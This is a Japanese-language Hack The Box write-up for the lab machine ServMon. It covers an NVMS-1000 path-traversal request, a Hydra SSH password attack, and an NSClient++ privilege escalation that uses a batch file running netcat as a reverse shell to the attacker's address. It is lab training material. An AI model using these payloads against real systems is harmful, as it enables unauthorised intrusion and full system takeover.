# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。  
主に記録用として記しています。  
現在のランクはHackerです。  
間違っていることも多いかと思いますが、よろしくお願いします。  
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
チートシートも公開しておりますが知識がまだまだ不足しているため、学習経過とともに身につけた内容などを随時更新していきます。  
GitHub(ペネトレーションテスト用チートシート):  
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet  
Twitter:@yukitsukai1731　　

# ServMon
![logo.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/fa05c5df-df38-42a8-9002-3654f1101f0e.png)

ServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1000(Network Surveillance Management Software) instance. This is found to be vulnerable to LFI,which is used to read a list of passwords on a user's desktop. Using the credentials, we can SSH to the server as a second user. As this low-privileged user, it's possible enumerate the system and find the password for NSClient++ (a system monitoring agent). After creating an SSH tunnel, we can access the NSClient++ web app. The app contains functionality to create scripts that can be executed in the context of NT AUTHORITY\SYSTEM . Users have been given permissions to restart the NSCP service, and after creating a malicious script, the service is restarted and command execution is achieved as SYSTEM.

ServMonは、NVMS-1000(Network Surveillance Management Software)のインスタンスをホストするHTTPサーバを搭載したWindows用の簡単なマシンです。これは、ユーザのデスクトップ上のパスワードリストを読み取るために使用されるLFIに対して脆弱性があることが判明しています。これを利用して、2人目のユーザとしてサーバにSSH接続することができます。この低特権ユーザとして、システムを列挙し、NSClient++（システム監視エージェント）のパスワードを見つけることが可能です。SSHトンネルを作成した後、NSClient++のWebアプリにアクセスすることができます。このアプリには、NT AUTHORITY SYSTEM のコンテキストで実行可能なスクリプトを作成する機能が含まれています。ユーザーには、NSCP サービスを再起動する権限が与えられており、悪意のあるスクリプトを作成した後、サービスを再起動し、SYSTEM としてコマンド実行を実現しています。


# スキャン
ServMon(10.10.10.184)に対して、スキャンを行います。　　
まずnmapからスキャンを開始します。　　
## nmap 

```
nmap -sC -sV -oN servmon 10.10.10.184
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力

```
# Nmap 7.80 scan initiated Mon May 25 10:37:57 2020 as: nmap -sC -sV -oN servmon 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.25s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     k/ns
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=5/25%Time=5ECBD867%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=5/25%Time=5ECBD871%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0k/ns\0\0\0\0ml\)\0\x02\x04
SF:\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\x1
SF:8\x83\x03\x12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x
SF:2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.
SF:1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(R
SF:TSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocumen
SF:t\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length
SF::\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m27s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-25T14:43:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 25 10:40:52 2020 -- 1 IP address (1 host up) scanned in 174.56 seconds

```

このスキャン結果から、さまざまなサービスが動いていることが分かります。
21番ポートではMicrosoft ftpdが動いており、anonymousログインが許可されているので接続してみましょう。

## ftp
```
kali@kali:~$ ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
```
NadineとNathanという人物名のようなものが見つかります。調べていきましょう。

```
ftp> cd Nadine
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 0.26 secs (0.6463 kB/s)
ftp> cd ../
250 CWD command successful.
ftp> cd Nathan
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:10PM                  186 Notes to do.txt
226 Transfer complete.
ftp> get "Notes to do.txt"
local: Notes to do.txt remote: Notes to do.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
186 bytes received in 0.26 secs (0.6965 kB/s)
ftp> exit
```
Nadine、NathanをのぞいてみるとそれぞれConfidential.txtとNotes to do.txtというものが見つかりました。それぞれの中身を見てみましょう。

```
kali@kali:~$ cat 'Notes to do.txt'
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePointkali@kali:~$ 

日本語訳(DeepL)
1) NVMSのパスワードの変更 - 完了
2) NSClient アクセスのロックダウン - 完了
3) パスワードのアップロード
4) NVMSへのパブリックアクセスの削除
5) SharePointに秘密のファイルを配置する
```


```
kali@kali:~$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.
Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadinekali@kali:~$ 

日本語訳(DeepL)
デスクトップにPasswords.txtファイルを残してしまいました。
ご自身で編集されたら削除して、安全なフォルダに戻してください。
```

このことから、おそらくusers/Nathan/Desktop/Passwords.txtのようなディレクトリにパスワードファイルが置かれていることが推測できます。


# 侵入
Webサーバが動作していることが分かっているので、http\://10.10.10.184にアクセスしてみます。
![e.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/b81975aa-629d-7d87-21ff-cabdeabe259f.png)

先ほどのNotes to do.txtにも記載されていたNVMS-1000というものが動作していることが分かります。　　
searchsploitでNVMSを検索してみましょう。　　

```
kali@kali:~$ searchsploit nvms
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
NVMS 1000 - Directory Traversal                        | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Mo | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow     | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal                    | hardware/webapps/48311.py
------------------------------------------------------- ---------------------------------
```

どうやらディレクトリトラバーサルの脆弱性があるようです。hardware/webapps/47774.txtを閲覧してみましょう。

```
kali@kali:~$ searchsploit -x hardware/webapps/47774.txt

# Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan T<C3><BC>rle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

ディレクトリへのアクセス方法が分かったので、さきほどのpasswords.txtファイルがある場所にアクセスしてみましょう。　　
http\://10.10.10.184/../../../../../../../../../../../../users/Nathan/Desktop/Passwords.  txtにアクセスしたいのですがブラウザからはアクセスしても何も見ることができなかったため、Burp Suiteを使用して通信を改ざんします。

![f.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/6590bc70-c0a9-c49f-70fd-73c9c65c1ef4.png)
![g.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/431a70d4-e4a8-8279-a35e-8620b0a13b1c.png)

これをすべてコピーしてパスワードファイルを作成します。  

```
kali@kali:~/htb/ServMon$ cat passwords.txt 
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```
あとはhydraを使って、ヒットするパスワードがないか確かめてみましょう。

```
hydra -l Nadine -P passwords.txt ssh://10.10.10.184
```

```
kali@kali:~/htb/ServMon$ hydra -l Nadine -P passwords.txt ssh://10.10.10.184
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-26 05:21:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://10.10.10.184:22/
[22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-26 05:22:12
```

これでパスワードが見つかりました。  
ユーザ名:Nadine  
パスワード:L1k3B1gBut7s@W0rk  
あとはsshでログインしてみましょう。   

```
kali@kali:~$ ssh Nadine@10.10.10.184
Nadine@10.10.10.184's password: 
```

```
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.
                                                    
nadine@SERVMON C:\Users\Nadine>   
```

これでユーザ権限を得ることができました。


# 特権エスカレーション
Notes to do.txtにはNSClient++についての記述がありました。nadineの権限を使ってNSClient++について調べてみましょう。

```
nadine@SERVMON C:\Users\Nadine>cd C:\Program Files\NSClient++

nadine@SERVMON C:\Program Files\NSClient++>dir
 Volume in drive C has no label.                                           
 Volume Serial Number is 728C-D22C                                         
                                                                           
 Directory of C:\Program Files\NSClient++  
.
.                                                                                                         
10/04/2020  19:32             2,683 nsclient.ini
26/05/2020  10:46            30,965 nsclient.log
.
.
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
´╗┐# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1


; in flight - TODO
[/settings/NRPE/server]

; Undocumented key
ssl options = no-sslv2,no-sslv3

; Undocumented key
verify mode = peer-cert
.
.
.
```
ここにNSClient++のパスワードようなものがあります。  
これを利用してログインしてみましょう。  
まずsshトンネリングを使用します。  

```
ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184
```

```
https://127.0.0.1:8443/index.html#/
```

![j.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c10c7bb6-81c4-6faf-98d5-5352d5618a09.png)

このPasswordに先ほど入手したパスワードを入れるとログインできます。

次にGoogleでNSClietn++について知らべてみましょう。

![h.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/3b12d76e-a968-8009-54c5-ad87c87bb64f.png)

Exploit-DBに情報があったので、この手順の通りに進めてみたいと思います。
https://www.exploit-db.com/exploits/46802

![i.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c4b177b4-3291-5f60-f1a1-ba665ee0a838.png)


```
Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.  

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
	C:\Program Files\NSClient++>nscp web -- password --display
	Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
	@echo off
	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
	nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
	- foobar
		command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
	- foobar
		interval = 1m
		command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
	nc -nlvvp 443
	listening on [any] 443 ...
	connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
	Microsoft Windows [Version 10.0.17134.753]
	(c) 2018 Microsoft Corporation. All rights reserved.

	C:\Program Files\NSClient++>whoami
	whoami
	nt authority\system
	
Risk:
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
```
この時点で1の手順をクリアしていることが分かります。また2の手順もすでにenableになっていることが確認できます。
次に3の手順を行います。

```
kali@kali:~$ locate nc.exe
kali@kali:~$ cp /usr/share/windows-resources/binaries/nc.exe /home/kali/
```

サーバを立てて、nc.exeをダウンロードできるようにしましょう。

```
kali@kali:~$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

次にkaliで立てたサーバからpowershellを用いてnc.exeをダウンロードします。

```
nadine@SERVMON C:\Temp > powershell Invoke-WebRequest "http://10.10.14.20:4444/nc.exe" -OutFile c:\temp\nc.exe
```

nc.exeを起動できるようにbatファイルを作成します。

```
nadine@SERVMON C:\Temp > echo "@echo off" > evil.bat
nadine@SERVMON C:\Temp > echo c:\Temp\nc.exe 10.10.14.20 443 -e cmd.exe >> evil.bat
```

kaliで通信を受け取れるように、netcatで待ち受けておきます。

```
kali@kali:~$ sudo nc -lvnp 443
[sudo] kali のパスワード:
listening on [any] 443 ...
```
次は、scriptとschedulerを設定して行きましょう。  
Settings > external scripts > scripts > Add new  
を選択して、画像のように入力してください。  

![a.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d9ec0d77-6d02-4352-6fe3-bda9aa90792e.png)

scheduler > schedules > Add new  
を選択して、画像のように入力してください。  

![b.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d3727ff6-642b-5f33-b382-d4c5b0380d00.png)

最後にスクリプトを実行します。  
Queries > check_taskched > CheckTaskSched > Module is loaded  

![c.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/344dbcb3-9ab3-9c15-f254-e9fa86ff48e3.png)

![d.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/596d2498-98b6-60d0-cf12-40402cf551be.png)

実行すると待ち受けていたkaliのnetcatのほうにシェルが返ってきます。  

```
C:\Program Files\NSClient++>whoami
whoami
nt authority\system
```

無事、NT AUTHORITY\SYSTEMが得られました。  
お疲れ様でした。

